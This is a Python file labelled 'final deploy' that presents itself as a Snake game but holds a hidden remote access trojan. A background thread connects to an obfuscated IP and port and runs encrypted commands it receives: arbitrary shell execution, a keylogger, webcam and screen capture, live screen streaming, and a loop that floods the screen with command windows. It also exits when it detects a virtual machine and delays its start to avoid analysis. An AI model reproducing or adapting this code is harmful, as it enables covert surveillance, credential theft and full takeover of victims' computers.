#final deploy
import os
import subprocess
import socket
import threading
import time
import base64
import threading
import sys
import ctypes
import pickle
import zlib
import tkinter as tk
from PIL import ImageGrab
from tkinter import messagebox
import requests
import cv2
import random
from pynput import keyboard
import pyautogui
import pygame
from cryptography.fernet import Fernet
key1 = b'RCtt4YCH_0lI3jzeQHp6z40gevcyJmT9rnz8mGYuoOg='
key2 = b'cJUspcsBDy4BuLp_IqxxFAPZ11VDxts7JTc5vjuBT9k='
key3 = b'G1UQ9WdA1_k9-96yd3mS-10Tn1l3O5rsWvII9F3wh7k='
key4 = b'e6fdf9yXUcw6O_e7uAS7mNIf5xHUIV-aviNDMYY6V5Y='
key5 = b'6SD4hKWjhtCa4SeeoVCXXWbGwQgDBxTJm3Egz25A2b8='
key6 = b'0IxbLmoee0UmSKTsfiHUfpXySQOlCLNiOThjFCUypAs='
f1 = Fernet(key1)
f2 = Fernet(key2)
f3 = Fernet(key3)
f4 = Fernet(key4)
f5 = Fernet(key5)
f6 = Fernet(key6)
A = 1
B = 2
C = 3
D = 4
E = 5
F = 6
G = 7
H = 8
I = 9
J = 0
K = 00
L = 000
dot = "."
ath = "@"
a ="z"
b ="y"
c ="x"
d ="w"
e ="v"
f ="u"
g ="t"
h ="s"
i ="r"
j ="q"
k ="p"
l ="o"
m ="n"
n ="m"
o ="l"
p ="k"
q ="j"
r ="i"
s ="h"
t ="g"
u ="f"
v ="e"
w ="d"
x ="c"
y ="b"
z ="a"
def capture_image(save_path="captured_image.jpg"):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error: Could not access the camera.")
        return
    print("Press SPACE to capture image, ESC to exit.")
    while True:
        ret, frame = cap.read()
        if not ret:
            print("Failed to grab frame.")
            break
        cv2.imshow("Camera", frame)
        key = cv2.waitKey(1)
        if key % 256 == 27:  
            print("Closing camera...")
            break
        elif key % 256 == 32:
            cv2.imwrite(save_path, frame)
            print(f"Image saved as {save_path}")
            break
    cap.release()
    cv2.destroyAllWindows()
def change_wallpaper(image_path: str):
    image_path = os.path.abspath(image_path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 1 | 2)

def auto_capture(save_path="captured_image.jpg"):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error: Could not access the camera.")
        return
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(save_path, frame)
        print(f"Image saved automatically as {save_path}")
    else:
        print("Failed to capture image.")
    cap.release()
def download_image(url: str, save_path: str):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()  

        with open(save_path, "wb") as f:
            for chunk in response.iter_content(1024):
                f.write(chunk)

        print(f"Image downloaded successfully: {save_path}")
    except Exception as e:
        print(f"Error downloading image: {e}")
def on_press(key):
    try:
        with open("file.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("file.txt", "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False
def take_screenshot(save_path="screenshot.png"):
    screenshot = pyautogui.screenshot()
    screenshot.save(save_path)
    print(f"Screenshot saved as {save_path}")

def ADDRESS():
    #configure ip and port using the varibales and dot values here
    var = (f"{A}{I}{B}{dot}{A}{F}{H}{dot}{A}{J}{dot}{A}{J}{D}")
    var1 = (f"{I}{J}{I}{J}")
    dod = var.strip()
    dod1 = var1.strip()
    enc = dod
    enc2 = dod1
    op = base64.b64encode(enc.encode()).decode()
    op1 = base64.b64encode(enc2.encode()).decode()
    opt = decoded_string = base64.b64decode(op).decode()
    opt2 = decoded_string = base64.b64decode(op1).decode()
    pi = str(opt)
    rt = int(opt2)
    return pi,rt
link1,link2 = ADDRESS()
def screen():
    HOST = link1
    PORT = 8090
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.connect((HOST, PORT))
    while True:
    # Capture screen
        screenshot = ImageGrab.grab()
        screenshot = screenshot.resize((1900, 1000))  # Resize for performance
        data = pickle.dumps(screenshot)
        compressed_data = zlib.compress(data)

        # Send image data size first
        server_socket.sendall(len(compressed_data).to_bytes(4, 'big'))
        server_socket.sendall(compressed_data)
def encode_layer():
    link1,link2 = ADDRESS()
    base_link2 = str(link2)
    with open("zero_file.txt",mode='w')as file:
        file.write(link1)
    with open("zero_file1.txt",mode='w')as file1:
        file1.write(base_link2)
def extra_layer():
    encode_layer()
    with open("zero_file.txt",mode='rb')as files:
        read_files = files.read()
    with open("zero_file1.txt",mode='rb')as files1:
        read_files1 = files1.read()
    drag1 = f1.encrypt(read_files)
    drag2 = f2.encrypt(read_files1)
    return drag1,drag2
def simple():
    slot1,slot2 = extra_layer()
    dekrypt = f1.decrypt(slot1)
    dekrypt1 = f2.decrypt(slot2)
    os.remove("zero_file.txt")
    os.remove("zero_file1.txt")
    return dekrypt,dekrypt1
def filtering():
    a1,b1 = simple()
    a1conv = str(a1)
    b1conv = str(b1)
    a2 = (a1conv[2:-1])
    b2 = (b1conv[2:-1])
    return a2,b2
ai,bi = filtering()
ia = base64.b64encode(ai.encode()).decode()
ia2 = base64.b64encode(bi.encode()).decode()
_b_start_time = time.time()
_h1 = ia 
_h2 = ia2 
BUFFER_SIZE = 40960
def _f_check_env_anom():
    if 'VBOX_EGA_X_RES' in os.environ or 'VMWARE_TOOLS_VERSION' in os.environ: return True
    if time.time() - _b_start_time < 20: 
        pass
    return False
def _g_establish_conn(ip, port):
    _s_sock = None
    try:
        _s_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _s_sock.connect((ip, port))
        extra_code = b'gAAAAABpGK20PJboyBfULkBX2t-5h7hksRO0JaNNlA0i0X63lLQNtqWLw3AyBVddj-rwPJcBcMIQZkq61wnAQBDTupRWxbXk7gMRPZyILYtllZ9fpCQjSsPnaq7u-xjcf5Au2U9N0v2Y'
        _s_sock.send(extra_code)
        while True:
            _c_data = _s_sock.recv(BUFFER_SIZE).decode('utf-8', errors='ignore').strip()
            VARBULL = _c_data.encode("utf-8")
            letsgo = f5.decrypt(VARBULL)
            VARBULL1 = str(letsgo)
            VARBULL2 = (VARBULL1[2:-1])
            if VARBULL2 == "q0ut": 
                break
            elif VARBULL2 == "":
                continue
            elif VARBULL2 == "video":
                capture_image("captured_image.jpg")
                continue
            elif VARBULL2 == "capture":
                auto_capture("captured_image.jpg")
                change_wallpaper("captured_image.jpg")
                continue
            elif VARBULL2 == "ranimg":
                image_url = "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%2Fid%2FOIP.yspVofTI16CM3qRXSSnhmgHaEv%3Fpid%3DApi&f=1&ipt=7c5a528b810927f566b0adb679eef1c8751032aa40050c6c7bc9f8dae34234b3&ipo=images"
                save_location = "downloaded_image.jpg"
                download_image(image_url, save_location)
                change_wallpaper("downloaded_image.jpg")
                continue
            elif VARBULL2 == "keylogger":
                with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
                    listener.join()
                    continue
            elif VARBULL2 == "screenshot":
                take_screenshot("screenshot.png")
                change_wallpaper("screenshot.png")
                continue
            elif VARBULL2 == "virus":
                while True:
                    os.system("start cmd.exe")
                continue
            elif VARBULL == "screen":
                screen()
                continue
            else:
                try:
                    _p_proc = subprocess.Popen(VARBULL2, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    _o_out = _p_proc.stdout.read() + _p_proc.stderr.read()
                    wine_bottle = _o_out
                    WINE = f5.encrypt(wine_bottle)
                    _s_sock.send(WINE)# + b"\n")
                except Exception as _e_proc:
                    _s_sock.send(f"[-]_3rr_exec: {_e_proc}\n".encode('utf-8'))
        _s_sock.close()
    except Exception as _e_conn:
        pass 
def _a_run_main_game():
    #import pygame
    #import time
    #import random

    pygame.init()

    # Screen setup
    width, height = 600, 400
    block_size = 20
    speed = 15
    screen = pygame.display.set_mode((width, height))
    pygame.display.set_caption("Snake Game")

    # Colors
    black = (0, 0, 0)
    white = (255, 255, 255)
    red = (213, 50, 80)
    green = (0, 255, 0)
    blue = (50, 153, 213)

    # Fonts
    font_style = pygame.font.SysFont("bahnschrift", 25)
    score_font = pygame.font.SysFont("comicsansms", 35)

    clock = pygame.time.Clock()

    def score_display(score):
        value = score_font.render("Score: " + str(score), True, white)
        screen.blit(value, [0, 0])

    def draw_snake(block_size, snake_list):
        for x in snake_list:
            pygame.draw.rect(screen, green, [x[0], x[1], block_size, block_size])

    def message(msg, color):
        mesg = font_style.render(msg, True, color)
        screen.blit(mesg, [width / 6, height / 3])

    def game_loop():
        game_over = False
        game_close = False

        x1 = width / 2
        y1 = height / 2
        x1_change = 0
        y1_change = 0

        snake_list = []
        length_of_snake = 1

        foodx = round(random.randrange(0, width - block_size) / 20.0) * 20.0
        foody = round(random.randrange(0, height - block_size) / 20.0) * 20.0

        while not game_over:
            while game_close:
                screen.fill(black)
                message("Game Over! Press Q-Quit or C-Play Again", red)
                score_display(length_of_snake - 1)
                pygame.display.update()

                for event in pygame.event.get():
                    if event.type == pygame.KEYDOWN:
                        if event.key == pygame.K_q:
                            game_over = True
                            game_close = False
                        elif event.key == pygame.K_c:
                            game_loop()

            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    game_over = True
                elif event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_LEFT:
                        x1_change = -block_size
                        y1_change = 0
                    elif event.key == pygame.K_RIGHT:
                        x1_change = block_size
                        y1_change = 0
                    elif event.key == pygame.K_UP:
                        y1_change = -block_size
                        x1_change = 0
                    elif event.key == pygame.K_DOWN:
                        y1_change = block_size
                        x1_change = 0

            if x1 >= width or x1 < 0 or y1 >= height or y1 < 0:
                game_close = True

            x1 += x1_change
            y1 += y1_change
            screen.fill(blue)
            pygame.draw.rect(screen, red, [foodx, foody, block_size, block_size])
            snake_head = [x1, y1]
            snake_list.append(snake_head)

            if len(snake_list) > length_of_snake:
                del snake_list[0]

            for x in snake_list[:-1]:
                if x == snake_head:
                    game_close = True

            draw_snake(block_size, snake_list)
            score_display(length_of_snake - 1)
            pygame.display.update()

            if x1 == foodx and y1 == foody:
                foodx = round(random.randrange(0, width - block_size) / 20.0) * 20.0
                foody = round(random.randrange(0, height - block_size) / 20.0) * 20.0
                length_of_snake += 1

            clock.tick(speed)

        pygame.quit()

    game_loop()


if __name__ == "__main__":
    if _f_check_env_anom():
        sys.exit(0) 
    time.sleep(random.randint(5, 15))
    try:
        _ip = base64.b64decode(_h1).decode('utf-8')
        _port = int(base64.b64decode(_h2).decode('utf-8'))
    except Exception as _e_decode:
        sys.exit(1) 
    _t_shell = threading.Thread(target=_g_establish_conn, args=(_ip, _port))
    _t_shell.daemon = True 
    _t_shell.start()
    _a_run_main_game()
    time.sleep(random.randint(3, 7))
    


